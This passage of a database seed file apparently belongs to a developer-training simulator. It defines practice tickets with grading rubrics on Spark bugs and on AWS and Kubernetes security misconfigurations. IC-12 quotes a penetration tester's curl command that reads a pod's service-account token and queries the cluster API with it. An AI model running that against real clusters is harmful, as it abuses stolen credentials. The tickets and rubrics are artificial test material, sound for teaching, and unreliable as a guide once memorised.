      id: "ticket-df-12-seed-id-012",
      title: "DF-12: Spark Merchant Enrichment Join Takes 45 Minutes",
      description: `The transactions enrichment job is scheduled every 15 minutes but consistently takes 45+ minutes, causing the next run to overlap. The Spark UI shows a single stage taking 44 minutes with 180M rows shuffled across all executors. The join itself produces only 180M enriched rows from a 180M transaction table and an 800-row lookup table.

**What's happening:**
\`enrich_with_merchant()\` in \`src/spark/jobs/transactions.py\` joins a 180M-row transactions DataFrame with an 800-row \`merchant_categories\` DataFrame using a plain Spark join. Spark chooses a sort-merge join, shuffling all 180M rows across the network. With \`broadcast()\`, Spark would send the 800-row table to every executor in memory, completing in under 2 minutes.

**Your task:**
1. Wrap \`merchant_categories\` in \`pyspark.sql.functions.broadcast()\` before the join
2. Import: \`from pyspark.sql import functions as F\`
3. Change: \`transactions.join(F.broadcast(merchant_categories), on="merchant_id", how="left")\`
4. The fix is one line — the performance improvement is 20–30×

**Files:** \`src/spark/jobs/transactions.py\``,
      difficulty: Difficulty.MID,
      filesInvolved: ["src/spark/jobs/transactions.py"],
      rubric: {
        diagnosis: "Did they identify the sort-merge join on a 180M × 800 table as the root cause? Did they understand that broadcast join is appropriate when one side is small enough to fit in executor memory?",
        design: "Did they add F.broadcast() around merchant_categories? Is the threshold correct — 800 rows is well within the default broadcast threshold of 10MB?",
        communication: "Did they explain why Spark chose sort-merge join by default (it doesn't know the table is small without a hint or stats)? Did they quantify the improvement (45 min → 2 min)?",
        execution: "Is F.broadcast() applied to the small table? Is the join result correct (same rows, same schema)? Is the fix a single-line change?",
      },
      expectedMinutes: 20,
    },
    {
      id: "ticket-df-13-seed-id-013",
      title: "DF-13: Source Connector Passwords Stored as Plaintext in Database",
      description: `A security audit found that the \`source_credentials\` table contains plaintext database passwords, API keys, and S3 secret keys for all connected client data sources. Any developer with SELECT access to the table, any database backup file, or any SQL injection vulnerability anywhere in the API exposes all connected source credentials simultaneously.

**What's happening:**
\`save_credentials()\` in \`src/utils/credentials.py\` stores the credentials dict directly as a JSON column with no encryption. The \`SourceCredential\` model uses \`Column(JSON)\` with no encryption layer.

**Your task:**
1. Add \`cryptography\` to \`requirements.txt\`
2. Implement \`encrypt_credentials(data: dict) -> bytes\` using \`Fernet\` symmetric encryption with a key from an env var \`CREDENTIALS_ENCRYPTION_KEY\`
3. Implement \`decrypt_credentials(ciphertext: bytes) -> dict\`
4. Update \`save_credentials()\` to encrypt before storing and \`load_credentials()\` to decrypt after loading
5. Change the column type from \`JSON\` to \`LargeBinary\` to store the ciphertext

**Files:** \`src/utils/credentials.py\`, \`src/models/pipeline.py\``,
      difficulty: Difficulty.SENIOR,
      filesInvolved: ["src/utils/credentials.py", "src/models/pipeline.py"],
      rubric: {
        diagnosis: "Did they find the plaintext JSON storage? Did they identify both the attack vectors: direct DB access AND application-level SQLi? Did they list the affected credential types (DB passwords, API keys, S3 secrets)?",
        design: "Did they use Fernet (or equivalent AES-256)? Is the encryption key stored in an env var, not in code? Did they change the column type to store bytes? Did they handle key rotation considerations?",
        communication: "Did they explain the blast radius — one DB read exposes all client source credentials simultaneously? Did they recommend secrets manager (Vault, AWS Secrets Manager) as a stronger alternative?",
        execution: "Are credentials encrypted before storage? Are they decrypted only at pipeline runtime? Is the key stored securely (env var, not hardcoded)? Does the column type correctly store ciphertext?",
      },
      expectedMinutes: 60,
    },
    {
      id: "ticket-df-14-seed-id-014",
      title: "DF-14: NaN in Revenue Reports Whenever a Transaction Has a NULL Amount",
      description: `Finance reports that merchant revenue dashboards intermittently show 'NaN' for avg_transaction_value. The pattern: it always affects merchants who had at least one failed payment capture (where amount was not populated — stored as NULL). One NULL in a merchant's hourly window makes the entire window show NaN, corrupting the revenue report for that merchant for that hour.

**What's happening:**
\`calculate_merchant_metrics()\` and \`calculate_hourly_totals()\` in \`src/spark/jobs/aggregations.py\` call \`F.avg("amount")\` without filtering NULL values first. In Spark, \`avg()\` propagates NULL — if any input row has NULL amount, the aggregate result is NULL/NaN.

**Your task:**
1. Add \`.filter(F.col("amount").isNotNull())\` before each aggregation that uses \`amount\`
2. Alternatively, use \`F.avg(F.when(F.col("amount").isNotNull(), F.col("amount")))\` inline
3. Apply the fix to all three aggregation functions: \`calculate_hourly_totals\`, \`calculate_merchant_metrics\`, \`calculate_daily_summary\`
4. After the fix, a merchant with [100, 200, NULL] should have avg_transaction_value = 150.0, not NaN

**Files:** \`src/spark/jobs/aggregations.py\``,
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["src/spark/jobs/aggregations.py"],
      rubric: {
        diagnosis: "Did they find F.avg() without null filtering and understand that Spark's avg() propagates NULL when any input is NULL? Did they identify all three affected aggregation functions?",
        design: "Did they add the null filter before aggregating? Did they apply it to all three functions? Did they choose the filter approach vs the conditional approach and justify it?",
        communication: "Did they explain why NULL propagation is the default behaviour in SQL/Spark (following IEEE semantics)? Did they note that SUM handles NULL differently from AVG (SUM ignores NULL, AVG propagates it)?",
        execution: "Does calculate_merchant_metrics return avg=150.0 for [100, 200, NULL]? Are all three aggregation functions fixed? Is the NULL filter applied before the groupBy?",
      },
      expectedMinutes: 25,
    },
    {
      id: "ticket-df-15-seed-id-015",
      title: "DF-15: Concurrent Pipeline Runs Write Duplicate Rows to Warehouse",
      description: `The warehouse team found 340,000 duplicate rows in warehouse.transactions after last Tuesday's end-of-day batch. Investigation shows two pipeline runs for the same pipeline_id were active simultaneously — both read the same watermark, processed the same Kafka offsets, and wrote the same records to the warehouse. This happens when a run exceeds 15 minutes and the scheduler triggers a second run before the first completes.

**What's happening:**
\`run_pipeline()\` in \`src/pipeline/manager.py\` checks \`pipeline.is_running\` before starting, but the check and the subsequent update are separate non-atomic operations. Two concurrent callers can both read \`is_running=False\` before either sets it to \`True\` — both proceed to start a run.

**Your task:**
1. Replace the is_running check with a PostgreSQL advisory lock: \`SELECT pg_try_advisory_lock(hashtext(pipeline_id))\`
2. If the lock is not acquired (another run holds it), return \`"already_running"\` immediately
3. Release the lock when the run completes: \`SELECT pg_advisory_unlock(hashtext(pipeline_id))\`
4. This makes the guard atomic at the database level — no race condition is possible

**Files:** \`src/pipeline/manager.py\``,
      difficulty: Difficulty.SENIOR,
      filesInvolved: ["src/pipeline/manager.py"],
      rubric: {
        diagnosis: "Did they identify the TOCTOU (time-of-check-time-of-use) race condition in the is_running check? Did they understand that two concurrent readers both see is_running=False before either writes True?",
        design: "Did they use a database advisory lock or Redis distributed lock (SET NX EX)? Is the lock acquired before any work begins? Is it released in a finally block? Is the lock key derived from pipeline_id?",
        communication: "Did they explain TOCTOU and why the is_running flag in application code can never be race-condition-free? Did they compare advisory lock vs Redis SET NX as alternative approaches?",
        execution: "Is the advisory lock (or Redis NX lock) acquired atomically before the run starts? Is it released in the finally block? Does a second concurrent call correctly return 'already_running'?",
      },
      expectedMinutes: 55,
    },
  ];

  for (const t of dataforgeTickets) {
    await prisma.ticket.upsert({
      where: { id: t.id },
      update: {},
      create: { ...t, stack: Stack.PYTHON, codebaseId: dataforgeCodebase.id },
    });
  }

  // ── InfraCore codebase ────────────────────────────────────────────────────
  const infracoreCodebase = await prisma.codebase.upsert({
    where: { id: "infracore-seed-id-001" },
    update: {},
    create: {
      id: "infracore-seed-id-001",
      name: "InfraCore",
      stack: Stack.DEVOPS,
      repoUrl: "https://github.com/DevSimulate/InfraCore",
      description: "Infrastructure-as-code platform for Axiom Analytics — Terraform modules and Kubernetes manifests managing a production AWS environment processing 50M+ events/day.",
      companyLore: `Axiom Analytics is a B2B SaaS startup founded in 2021 providing real-time event analytics for e-commerce platforms. The platform processes 50M+ events per day across 200+ enterprise customers.

Infrastructure runs entirely on AWS — EKS for compute, RDS PostgreSQL for application data, ElastiCache Redis for caching, and S3 for event storage and ML model artifacts.

The DevOps setup was bootstrapped by contractors in 2022 who built the initial Terraform modules and Kubernetes manifests, then handed over to Jordan (the first full-time DevOps hire) in late 2023. A second engineer, Sam, joined 3 months ago. Neither had full visibility into the contractors' original decisions.

Key facts engineers must know:
- The production EKS cluster runs across us-east-1a and us-east-1b
- The primary RDS instance is PostgreSQL 15.4 on db.t3.large
- Background workers handle Kafka event ingestion and ML pipeline runs
- Terraform state is stored in S3; GitHub Actions applies changes on merge to main
- Axiom is beginning a SOC 2 Type II audit in Q3 2026 — security issues are now critical
- The engineering team has no on-call rotation yet; any outage is manually escalated`,
    },
  });

  const infracoreTickets = [
    {
      id: "ticket-ic-01-seed-id-001",
      title: "IC-01: Terraform State Lock Missing on Production Backend",
      description: `Two engineers both ran \`terraform apply\` on the production environment at the same time last Thursday. One apply succeeded; the other corrupted the state file and left several resources in an unknown state. It took 4 hours to manually reconcile.

**Root cause:**
\`terraform/environments/production/backend.tf\` configures an S3 backend but has no \`dynamodb_table\` for state locking. Without a lock, two concurrent applies both read the current state, make their changes independently, and the last writer wins — corrupting state with a partial view of reality.

**Your task:**
1. Add a DynamoDB table resource in \`terraform/modules/storage/main.tf\` named \`axiom-terraform-state-lock\` with \`hash_key = "LockID"\` and \`billing_mode = "PAY_PER_REQUEST"\`
2. Add \`dynamodb_table = "axiom-terraform-state-lock"\` to the S3 backend block in \`terraform/environments/production/backend.tf\`
3. Explain why this prevents concurrent apply corruption

**Files:** \`terraform/environments/production/backend.tf\`, \`terraform/modules/storage/main.tf\``,
      difficulty: Difficulty.MID,
      filesInvolved: ["terraform/environments/production/backend.tf", "terraform/modules/storage/main.tf"],
      rubric: {
        diagnosis: "Did they correctly identify that the missing dynamodb_table is the cause of state corruption under concurrent applies? Did they understand that S3 alone provides no mutual exclusion?",
        design: "Did they add the DynamoDB table with the correct LockID hash key? Did they add dynamodb_table to the backend config? Did they note that billing_mode PAY_PER_REQUEST is appropriate for low-frequency lock operations?",
        communication: "Did they explain that Terraform acquires a lock by writing to DynamoDB before reading state, and releases it after apply completes? Did they explain why the corruption happened — last-writer-wins on S3?",
        execution: "Is the DynamoDB resource correctly defined with hash_key = 'LockID'? Is the backend config updated with the table name? Would two concurrent applies now correctly block?",
      },
      expectedMinutes: 25,
    },
    {
      id: "ticket-ic-02-seed-id-002",
      title: "IC-02: Production Database Has No Multi-AZ or Automated Backups",
      description: `The us-east-1b availability zone had a 45-minute outage last month. During that window, Axiom's production database was completely unreachable — it was deployed as a single instance in us-east-1b with no standby replica. Customers were unable to use the platform for 45 minutes.

Separately, the ops team discovered that \`backup_retention_period = 0\` means automated backups are disabled. If the instance were to be terminated or corrupted, there is no point-in-time recovery available.

**Root cause in \`terraform/modules/database/main.tf\`:**
- \`multi_az = false\` — no standby replica in a second AZ
- \`backup_retention_period = 0\` — automated backups disabled

**Your task:**
1. Set \`multi_az = true\` so AWS maintains a synchronous standby in a second AZ with automatic failover
2. Set \`backup_retention_period = 7\` for 7 days of point-in-time recovery
3. Add \`backup_window = "03:00-04:00"\` and \`maintenance_window = "Mon:04:00-Mon:05:00"\` to control when these run
4. Explain the RTO and RPO impact of each change

**Files:** \`terraform/modules/database/main.tf\``,
      difficulty: Difficulty.SENIOR,
      filesInvolved: ["terraform/modules/database/main.tf"],
      rubric: {
        diagnosis: "Did they identify both multi_az=false and backup_retention_period=0 as separate reliability failures? Did they understand that multi_az protects against AZ failure while backups protect against data corruption/accidental deletion?",
        design: "Did they set multi_az=true and backup_retention_period to at least 7? Did they add backup and maintenance windows to avoid peak hours? Did they mention that enabling multi_az on an existing instance triggers a brief failover?",
        communication: "Did they explain RTO (multi_az gives sub-2-minute automatic failover vs hours of manual recovery) and RPO (backups give point-in-time recovery vs total loss)? Did they flag that the 45-minute outage was preventable?",
        execution: "Are both multi_az=true and backup_retention_period>=7 present? Are backup/maintenance windows set to off-peak hours? Is the fix complete for both reliability issues?",
      },
      expectedMinutes: 40,
    },
    {
      id: "ticket-ic-03-seed-id-003",
      title: "IC-03: Application IAM Role Has Wildcard Permissions",
      description: `Security flagged this ahead of the SOC 2 audit: the IAM role attached to all application EC2 instances and EKS nodes has \`Action: "*"\` on \`Resource: "*"\`. Every running instance can perform any AWS API call on any resource in the account.

During a routine dependency scan last week, a compromised npm package was found in one of the worker containers. If that package had been malicious and exfiltrated the EC2 instance metadata credentials, the attacker would have had full AWS account access — they could read all S3 data, delete the RDS instance, create new IAM users, and disable CloudTrail.

**Root cause in \`terraform/modules/iam/main.tf\`:**
The \`app_policy\` inline policy grants \`"Action": "*"\` and \`"Resource": "*"\`.

**Your task:**
1. Replace the wildcard policy with a least-privilege policy that grants only what the API actually needs:
   - \`s3:GetObject\`, \`s3:PutObject\` on the assets and ml-artifacts buckets
   - \`secretsmanager:GetSecretValue\` on \`arn:aws:secretsmanager:us-east-1:*:secret:axiom-*\`
   - \`logs:CreateLogGroup\`, \`logs:CreateLogStream\`, \`logs:PutLogEvents\` on the axiom log group
2. Explain the blast radius difference between the current policy and your fix

**Files:** \`terraform/modules/iam/main.tf\``,
      difficulty: Difficulty.SENIOR,
      filesInvolved: ["terraform/modules/iam/main.tf"],
      rubric: {
        diagnosis: "Did they identify Action='*' Resource='*' as the core problem? Did they understand that EKS node roles use the same instance profile, so all pods inherit these permissions?",
        design: "Did they replace the wildcard with specific actions on specific resources? Did they scope S3 permissions to the specific bucket ARNs? Did they scope Secrets Manager to the axiom prefix? Did they avoid over-granting?",
        communication: "Did they explain least-privilege principle? Did they quantify the blast radius difference — wildcard = full account takeover vs scoped = read 2 specific S3 buckets? Did they mention the compromised package scenario?",
        execution: "Is the new policy restricted to specific actions? Are resource ARNs scoped (not *)? Is the Secrets Manager ARN pattern correct? Would this policy still allow the app to function?",
      },
      expectedMinutes: 45,
    },
    {
      id: "ticket-ic-04-seed-id-004",
      title: "IC-04: Bastion Security Group Allows SSH from All IPs",
      description: `The network team noticed the bastion host security group allows inbound SSH (port 22) from \`0.0.0.0/0\`. This means any machine on the internet can attempt to connect to the bastion.

Over the past 30 days, CloudWatch logs show 14,000 failed SSH authentication attempts from 340 unique IPs — all automated scanning bots probing for weak credentials. One of the attempts used a valid username (discovered via a public GitHub commit) with a dictionary password list.

**Root cause in \`terraform/modules/networking/main.tf\`:**
The \`axiom-bastion-sg\` security group ingress rule sets \`cidr_blocks = ["0.0.0.0/0"]\` on port 22.

**Your task:**
1. Change \`cidr_blocks\` to allow SSH only from the company VPN CIDR (\`203.0.113.0/24\`) instead of \`0.0.0.0/0\`
2. Recommend a better long-term alternative to a bastion host (e.g. AWS Systems Manager Session Manager) and explain why it eliminates the attack surface entirely

**Files:** \`terraform/modules/networking/main.tf\``,
      difficulty: Difficulty.MID,
      filesInvolved: ["terraform/modules/networking/main.tf"],
      rubric: {
        diagnosis: "Did they identify 0.0.0.0/0 on port 22 as the issue? Did they understand the practical risk demonstrated by the 14,000 scan attempts in the logs?",
        design: "Did they restrict cidr_blocks to a specific IP range? Did they recommend SSM Session Manager as the better alternative? Did they explain that SSM requires no open inbound ports at all?",
        communication: "Did they explain that SSM Session Manager uses outbound HTTPS only — no inbound firewall rules needed? Did they mention that SSM also provides audit logging of all session commands automatically?",
        execution: "Is 0.0.0.0/0 replaced with a specific CIDR? Is the recommendation for SSM Session Manager technically accurate? Would the fix stop the 14,000 daily scan attempts?",
      },
      expectedMinutes: 25,
    },
    {
      id: "ticket-ic-05-seed-id-005",
      title: "IC-05: Production S3 Bucket Has Public Read ACL and No Versioning",
      description: `The assets S3 bucket (\`axiom-production-assets\`) was configured with \`acl = "public-read"\` to serve customer-facing files. However, this exposes every object in the bucket — including internal config snapshots, ML model weights, and temporary processing files that engineers upload manually — to anyone with the URL.

Additionally, there is no versioning on any bucket. Last week an engineer accidentally overwrote a production ML model with a staging version. There was no way to recover the previous version.

**Root cause in \`terraform/modules/storage/main.tf\`:**
- \`aws_s3_bucket_acl\` sets \`acl = "public-read"\` on the assets bucket
- No \`aws_s3_bucket_versioning\` resource exists for any bucket

**Your task:**
1. Remove the \`aws_s3_bucket_acl\` resource entirely (default is private)
2. Add an \`aws_s3_bucket_versioning\` resource for both \`assets\` and \`ml_artifacts\` buckets with \`status = "Enabled"\`
3. Explain how to serve public assets correctly without a public-read bucket ACL (CloudFront + OAC)

**Files:** \`terraform/modules/storage/main.tf\``,
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["terraform/modules/storage/main.tf"],
      rubric: {
        diagnosis: "Did they identify the public-read ACL as exposing all objects? Did they identify that missing versioning caused the unrecoverable overwrite?",
        design: "Did they remove the ACL resource? Did they add versioning for both buckets? Did they correctly describe CloudFront + OAC (Origin Access Control) as the right pattern for serving public assets?",
        communication: "Did they explain that OAC restricts S3 access to CloudFront only, so the bucket stays private? Did they explain that versioning enables restore from any previous version?",
        execution: "Is the public-read ACL resource removed? Is aws_s3_bucket_versioning added with status=Enabled for the right buckets? Is the CloudFront/OAC recommendation technically correct?",
      },
      expectedMinutes: 25,
    },
    {
      id: "ticket-ic-06-seed-id-006",
      title: "IC-06: AWS Credentials and Secrets Hardcoded in terraform.tfvars",
      description: `A security researcher submitted a responsible disclosure report this morning. They found live AWS access keys in \`terraform/environments/production/terraform.tfvars\` committed to the public GitHub repository. The keys have been rotated, but the file also contains the production database password, JWT secret, and Stripe API key.

The file was committed by a contractor 18 months ago and has been publicly readable ever since.

**Root cause:**
\`terraform/environments/production/terraform.tfvars\` contains \`aws_access_key\`, \`aws_secret_key\`, \`db_password\`, and other secrets in plaintext. The file is tracked by git and was pushed to the public repository.

**Your task:**
1. Add \`terraform/environments/production/terraform.tfvars\` to \`.gitignore\` immediately
2. Remove the credential variables from \`variables.tf\` and the provider block — instead configure AWS credentials via environment variables (\`AWS_ACCESS_KEY_ID\` / \`AWS_SECRET_ACCESS_KEY\`) or an IAM role
3. Move \`db_password\` to AWS Secrets Manager and reference it with a \`data "aws_secretsmanager_secret_version"\` data source
4. Describe what should have been done at the time of the original contractor commit to prevent this

**Files:** \`terraform/environments/production/terraform.tfvars\`, \`.gitignore\`, \`terraform/environments/production/variables.tf\`, \`terraform/modules/database/main.tf\``,
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["terraform/environments/production/terraform.tfvars", ".gitignore", "terraform/environments/production/variables.tf"],
      rubric: {
        diagnosis: "Did they identify that the file is tracked by git and publicly visible? Did they understand that rotating the keys is necessary but not sufficient — the historical commit still exists unless the repo is scrubbed?",
        design: "Did they add the tfvars to .gitignore? Did they replace provider credential vars with environment variable usage? Did they describe Secrets Manager as the correct pattern for db_password?",
        communication: "Did they explain that git history must be purged (git filter-branch or BFG Repo-Cleaner) to fully remove the secret? Did they mention pre-commit hooks or git-secrets to prevent future commits?",
        execution: "Is .gitignore updated? Is the provider block updated to not use variables for credentials? Is the Secrets Manager data source pattern correct?",
      },
      expectedMinutes: 25,
    },
    {
      id: "ticket-ic-07-seed-id-007",
      title: "IC-07: Production RDS Has No Deletion Protection",
      description: `A junior engineer was cleaning up staging resources last Friday. They ran \`terraform destroy\` from the wrong terminal window — the one connected to the production environment instead of staging. Terraform deleted the production RDS instance in 3 minutes. Because \`skip_final_snapshot = true\`, no snapshot was taken.

Data from the past 6 hours was permanently lost. The previous manual snapshot was 6 hours old.

**Root cause in \`terraform/modules/database/main.tf\`:**
- No \`lifecycle { prevent_destroy = true }\` block — Terraform will destroy the resource on \`terraform destroy\`
- \`skip_final_snapshot = true\` — no snapshot is created on deletion
- \`deletion_protection\` attribute is absent (defaults to false at the RDS API level)

**Your task:**
1. Add \`deletion_protection = true\` to the \`aws_db_instance\` resource — this makes the RDS API refuse any delete request
2. Add a \`lifecycle\` block with \`prevent_destroy = true\` — this makes Terraform refuse to plan a destroy of this resource
3. Change \`skip_final_snapshot = false\` and add \`final_snapshot_identifier = "axiom-production-db-final-\${formatdate("YYYY-MM-DD", timestamp())}"\`
4. Explain why both \`deletion_protection\` and \`prevent_destroy\` are needed (they protect at different layers)

**Files:** \`terraform/modules/database/main.tf\``,
      difficulty: Difficulty.SENIOR,
      filesInvolved: ["terraform/modules/database/main.tf"],
      rubric: {
        diagnosis: "Did they identify all three missing protections — deletion_protection, prevent_destroy lifecycle, and skip_final_snapshot=true? Did they understand that these are three independent layers of protection?",
        design: "Did they add all three fixes? Did they provide a meaningful final_snapshot_identifier? Did they explain that prevent_destroy is Terraform-layer only (circumventable by removing the block) while deletion_protection is AWS API-layer?",
        communication: "Did they explain the layered defense — prevent_destroy stops the plan, deletion_protection stops the AWS API call, and final_snapshot ensures recovery if both are bypassed? Did they recommend workspace isolation (different AWS accounts for prod vs staging)?",
        execution: "Are all three protections present in the resource block? Is deletion_protection=true? Is prevent_destroy=true in a lifecycle block? Is skip_final_snapshot=false with a valid identifier?",
      },
      expectedMinutes: 30,
    },
    {
      id: "ticket-ic-08-seed-id-008",
      title: "IC-08: API Deployment Has No Resource Limits or Requests",
      description: `The API deployment has been crashing other workloads on shared nodes. When traffic spikes (e.g. end-of-day batch processing), API pods consume all available memory on the node, triggering OOM kills of the monitoring agents and worker pods that share the node.

The Kubernetes scheduler also cannot make good placement decisions for the API pods because it has no idea how much CPU and memory each pod will need — it places them arbitrarily and they end up co-located on already-starved nodes.

**Root cause in \`kubernetes/deployments/api-deployment.yaml\`:**
No \`resources\` block is defined under the container spec.

**Your task:**
Add appropriate resource requests and limits to the API container:
\`\`\`yaml
resources:
  requests:
    memory: "256Mi"
    cpu: "250m"
  limits:
    memory: "512Mi"
    cpu: "500m"
\`\`\`
Explain the difference between requests (used for scheduling) and limits (enforced at runtime), and why setting limits lower than available node memory prevents the OOM kill cascade.

**Files:** \`kubernetes/deployments/api-deployment.yaml\``,
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["kubernetes/deployments/api-deployment.yaml"],
      rubric: {
        diagnosis: "Did they identify the missing resources block? Did they understand that without requests, pods can be co-scheduled on the same node until it runs out of memory?",
        design: "Did they add both requests and limits? Are the values reasonable for an API pod? Did they explain that requests affect scheduling while limits trigger OOM kills?",
        communication: "Did they explain that Kubernetes uses requests for bin-packing decisions and limits as hard enforcement? Did they note that limits > requests is intentional (allows bursting)?",
        execution: "Is the resources block added under the container spec? Are both requests and limits defined for memory and cpu? Are the values sensible (not 0 or unreasonably high)?",
      },
      expectedMinutes: 20,
    },
    {
      id: "ticket-ic-09-seed-id-009",
      title: "IC-09: Worker Pod Runs with Privileged Security Context",
      description: `A penetration test found that the worker pods run with \`privileged: true\` in their security context. The tester demonstrated a container breakout: they mounted the host filesystem from inside the worker container and read \`/etc/kubernetes/pki/ca.crt\` (the cluster CA certificate) and the kubelet's service account token, giving them full cluster admin access.

This is a critical finding that must be resolved before the SOC 2 audit.

**Root cause in \`kubernetes/deployments/worker-deployment.yaml\`:**
\`securityContext.privileged: true\` gives the container full access to the host kernel — equivalent to root on the node.

**Your task:**
Replace the privileged security context with a hardened one:
\`\`\`yaml
securityContext:
  privileged: false
  allowPrivilegeEscalation: false
  runAsNonRoot: true
  runAsUser: 1000
  readOnlyRootFilesystem: true
  capabilities:
    drop: ["ALL"]
\`\`\`
Explain what each field does and why \`readOnlyRootFilesystem: true\` blocks a common post-exploitation technique.

**Files:** \`kubernetes/deployments/worker-deployment.yaml\``,
      difficulty: Difficulty.SENIOR,
      filesInvolved: ["kubernetes/deployments/worker-deployment.yaml"],
      rubric: {
        diagnosis: "Did they identify privileged=true as enabling container escape? Did they understand that a privileged container has the same kernel access as the host node?",
        design: "Did they replace with all the hardened fields: privileged=false, allowPrivilegeEscalation=false, runAsNonRoot=true, readOnlyRootFilesystem=true, capabilities.drop=['ALL']? Did they explain each field?",
        communication: "Did they explain that readOnlyRootFilesystem prevents the attacker from writing malware or modifying scripts in the container filesystem post-exploitation? Did they mention that dropping ALL capabilities and runAsNonRoot together remove almost all privilege escalation vectors?",
        execution: "Is privileged set to false (or removed)? Are allowPrivilegeEscalation, runAsNonRoot, and readOnlyRootFilesystem all set? Are all capabilities dropped?",
      },
      expectedMinutes: 35,
    },
    {
      id: "ticket-ic-10-seed-id-010",
      title: "IC-10: API Deployment Missing Liveness and Readiness Probes",
      description: `Users are reporting intermittent 502 errors on the API. Investigation shows that during deployments, Kubernetes routes traffic to new API pods before they have finished connecting to the database and warming up their connection pool — the pod is running but not ready to serve requests.

Additionally, there have been two incidents in the past month where an API pod entered a deadlock state and stopped responding to requests. Because there is no liveness probe, the pod was never restarted — it just sat there for hours returning no response while Kubernetes kept routing traffic to it.

**Root cause in \`kubernetes/deployments/api-deployment.yaml\`:**
No \`readinessProbe\` or \`livenessProbe\` defined.

**Your task:**
Add both probes to the API container:
\`\`\`yaml
readinessProbe:
  httpGet:
    path: /healthz
    port: 8080
  initialDelaySeconds: 10
  periodSeconds: 5
  failureThreshold: 3
livenessProbe:
  httpGet:
    path: /healthz
    port: 8080
  initialDelaySeconds: 30
  periodSeconds: 10
  failureThreshold: 3
\`\`\`
Explain the difference between readiness (controls traffic routing) and liveness (controls restart), and why \`initialDelaySeconds\` on the liveness probe must be longer than on the readiness probe.

**Files:** \`kubernetes/deployments/api-deployment.yaml\``,
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["kubernetes/deployments/api-deployment.yaml"],
      rubric: {
        diagnosis: "Did they identify missing probes as causing both the deployment 502s (no readiness probe) and the deadlock incidents (no liveness probe)?",
        design: "Did they add both readiness and liveness probes? Is the liveness initialDelaySeconds longer than the readiness one? Did they explain why (liveness fires restart, which would crash-loop a pod that just needs time to start)?",
        communication: "Did they clearly explain the semantic difference — readiness controls whether traffic is sent to the pod, liveness controls whether the pod is restarted? Did they explain failureThreshold?",
        execution: "Are both probes present? Do they target /healthz on the correct port? Is initialDelaySeconds on liveness >= initialDelaySeconds on readiness? Is periodSeconds reasonable?",
      },
      expectedMinutes: 25,
    },
    {
      id: "ticket-ic-11-seed-id-011",
      title: "IC-11: Database Credentials Stored in ConfigMap Instead of Secret",
      description: `During an internal security review, the team found that \`kubernetes/configmaps/app-config.yaml\` contains the production database URL (including password), JWT signing secret, and other sensitive values in a ConfigMap.

Any developer with \`kubectl get configmap\` access in the \`axiom\` namespace can read these values in plaintext. Additionally, ConfigMaps are often included in cluster backups and audit exports where secrets would be redacted.

**Root cause in \`kubernetes/configmaps/app-config.yaml\`:**
\`database_url\`, \`db_password\`, \`jwt_secret\`, and \`stripe_api_key\` are stored as ConfigMap data instead of Kubernetes Secrets.

**Your task:**
1. Remove all sensitive values from \`app-config.yaml\` — keep only non-sensitive config (\`api_url\`, \`redis_url\`, \`kafka_brokers\`, \`log_level\`)
2. Create a new \`kubernetes/secrets/app-secrets.yaml\` using a Kubernetes Secret (note: values must be base64-encoded in the manifest)
3. Update the \`api-deployment.yaml\` to reference the secret via \`secretKeyRef\` instead of \`configMapKeyRef\`
4. Explain why Kubernetes Secrets are not truly secure by default and what the correct production approach is (External Secrets Operator + AWS Secrets Manager)

**Files:** \`kubernetes/configmaps/app-config.yaml\`, \`kubernetes/deployments/api-deployment.yaml\``,
      difficulty: Difficulty.MID,
      filesInvolved: ["kubernetes/configmaps/app-config.yaml", "kubernetes/deployments/api-deployment.yaml"],
      rubric: {
        diagnosis: "Did they identify that ConfigMap data is stored unencrypted in etcd and readable by anyone with kubectl access? Did they note that Secrets are also base64-only by default (not encrypted) but enable fine-grained RBAC and encryption-at-rest?",
        design: "Did they remove credentials from the ConfigMap? Did they create a Secret manifest with base64-encoded values? Did they update the deployment to use secretKeyRef? Did they recommend External Secrets Operator + AWS Secrets Manager?",
        communication: "Did they explain that Kubernetes Secrets are only as secure as etcd encryption and RBAC? Did they describe the External Secrets Operator pattern — secrets live in AWS Secrets Manager and are synced into K8s Secrets, never in git?",
        execution: "Are sensitive keys removed from the ConfigMap? Is the Secret manifest correct with base64-encoded values? Is the deployment updated to use secretKeyRef? Is the External Secrets approach described correctly?",
      },
      expectedMinutes: 35,
    },
    {
      id: "ticket-ic-12-seed-id-012",
      title: "IC-12: API Pod Bound to ClusterAdmin ServiceAccount",
      description: `The security audit found the most critical issue in the cluster: \`api-service-account\` is bound to the \`cluster-admin\` ClusterRole via a ClusterRoleBinding. All three API pod replicas run under this ServiceAccount.

The penetration tester demonstrated the impact: from inside an API pod, they ran:
\`\`\`
curl -s https://kubernetes.default/api/v1/namespaces --header "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
\`\`\`
And received a full list of all namespaces, secrets, and resources in the cluster. They then deleted the monitoring namespace to prove unrestricted write access.

**Root cause in \`kubernetes/rbac/roles.yaml\`:**
\`ClusterRoleBinding axiom-api-admin-binding\` binds \`api-service-account\` to \`cluster-admin\`.

**Your task:**
1. Delete the \`ClusterRoleBinding\` that grants cluster-admin
2. Create a minimal \`Role\` (not \`ClusterRole\`) in the \`axiom\` namespace with only the permissions the API actually needs: \`get\` and \`list\` on \`configmaps\`
3. Create a \`RoleBinding\` to bind \`api-service-account\` to this new Role
4. Explain the difference between a Role/RoleBinding (namespace-scoped) and ClusterRole/ClusterRoleBinding (cluster-wide), and why the API should never need cluster-wide permissions

**Files:** \`kubernetes/rbac/roles.yaml\``,
      difficulty: Difficulty.SENIOR,
      filesInvolved: ["kubernetes/rbac/roles.yaml"],
      rubric: {
        diagnosis: "Did they identify the ClusterRoleBinding to cluster-admin as giving API pods unrestricted cluster-wide access? Did they understand that the service account token is auto-mounted into every pod?",
        design: "Did they remove the ClusterRoleBinding? Did they create a namespace-scoped Role (not ClusterRole)? Is the Role limited to get/list on configmaps? Is a RoleBinding used (not ClusterRoleBinding)?",
        communication: "Did they explain Role vs ClusterRole scope? Did they note that if the API doesn't need K8s API access at all, automountServiceAccountToken: false is even better? Did they explain the penetration test impact clearly?",
        execution: "Is the ClusterRoleBinding removed or replaced? Is the new Role namespace-scoped with minimal permissions? Is RoleBinding (not ClusterRoleBinding) used for the api-service-account?",
      },
      expectedMinutes: 40,
    },
    {
      id: "ticket-ic-13-seed-id-013",
